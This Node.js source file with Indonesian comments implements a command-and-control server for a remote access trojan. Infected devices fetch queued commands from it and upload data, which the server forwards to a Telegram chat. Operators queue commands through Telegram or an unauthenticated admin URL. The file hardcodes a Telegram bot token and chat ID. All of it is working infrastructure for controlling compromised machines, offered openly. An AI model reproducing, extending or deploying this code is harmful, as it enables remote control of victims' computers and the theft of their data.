const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();

app.use(bodyParser.json());

// ==========================================
// KONFIGURASI PAKCIK
// ==========================================
const TG_TOKEN = "9165602208:AAHhpX7c7nuVDN2J4N-u0sioRCaE4BuyuRw";
const TG_CHAT_ID = "8831607999";
const API_URL = `https://api.telegram.org/bot${TG_TOKEN}/`;

// Penyimpanan sementara
let activeClients = {};
let commandQueue = {};
let lastTelegramUpdateId = 0;

// ==========================================
// ENDPOINT 1: RAT (CLIENT) NGE-CEK COMMAND
// ==========================================
app.get('/api/cmd/:device_id', (req, res) => {
    const devId = req.params.device_id;
    activeClients[devId] = Date.now(); // Update heartbeat
    
    const cmd = commandQueue[devId] || "";
    commandQueue[devId] = ""; // Hapus setelah diambil
    
    res.json({ command: cmd, status: "ok" });
});

// ==========================================
// ENDPOINT 2: RAT (CLIENT) NGIRIM DATA
// ==========================================
app.post('/api/upload', async (req, res) => {
    const { device_id, type, payload } = req.body;
    
    activeClients[device_id] = Date.now();
    
    let msg = `📥 [${device_id}] ${type.toUpperCase()}\n\`\`\`\n${payload}\n\`\`\``;
    
    // Kirim ke Telegram
    try {
        await axios.post(API_URL + "sendMessage", {
            chat_id: TG_CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
    } catch (e) {
        console.error("Telegram Error:", e.message);
    }

    res.json({ status: "received" });
});

// ==========================================
// ENDPOINT 3: ADMIN (Bisa dipake kalo males pake tele)
// ==========================================
app.get('/admin/send/:device_id/:cmd', (req, res) => {
    const devId = req.params.device_id;
    const cmd = req.params.cmd;
    commandQueue[devId] = cmd;
    res.send(`[+] Perintah "${cmd}" dimasukkan ke antrean untuk device: ${devId}`);
});

// ==========================================
// POLLING TELEGRAM (DARI SERVER, BUKAN DARI RAT)
// ==========================================
async function pollTelegram() {
    while (true) {
        try {
            const res = await axios.get(API_URL + `getUpdates?offset=${lastTelegramUpdateId + 1}&timeout=30`);
            if (res.data.ok && res.data.result.length > 0) {
                for (let update of res.data.result) {
                    lastTelegramUpdateId = update.update_id;
                    if (update.message && update.message.text) {
                        let text = update.message.text;
                        
                        // Format command: /cmd DEVICE_ID PERINTAH
                        if (text.startsWith('/cmd ')) {
                            let parts = text.split(' ');
                            if (parts.length >= 3) {
                                let targetDev = parts[1];
                                let actualCmd = parts.slice(2).join(' ');
                                commandQueue[targetDev] = actualCmd;
                                await axios.post(API_URL + "sendMessage", {
                                    chat_id: TG_CHAT_ID,
                                    text: `✅ Perintah dikirim ke **${targetDev}**`
                                });
                            } else {
                                await axios.post(API_URL + "sendMessage", {
                                    chat_id: TG_CHAT_ID,
                                    text: `❌ Format salah. Contoh: /cmd DESKTOP-XXX whoami`
                                });
                            }
                        } 
                        // Command buat liat target online
                        else if (text === '/list') {
                            let msg = "🟢 **Active Clients:**\n";
                            for (let id in activeClients) {
                                msg += `- ${id}\n`;
                            }
                            await axios.post(API_URL + "sendMessage", {
                                chat_id: TG_CHAT_ID,
                                text: msg
                            });
                        }
                    }
                }
            }
        } catch (e) {
            console.error("Telegram Poll Error:", e.message);
        }
        await new Promise(r => setTimeout(r, 3000)); // Jeda 3 detik
    }
}

// Jalanin Polling Telegram
pollTelegram();

// ==========================================
// JALANIN SERVER
// ==========================================
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] C2 API Bridge jalan di http://0.0.0.0:${PORT}`);
});
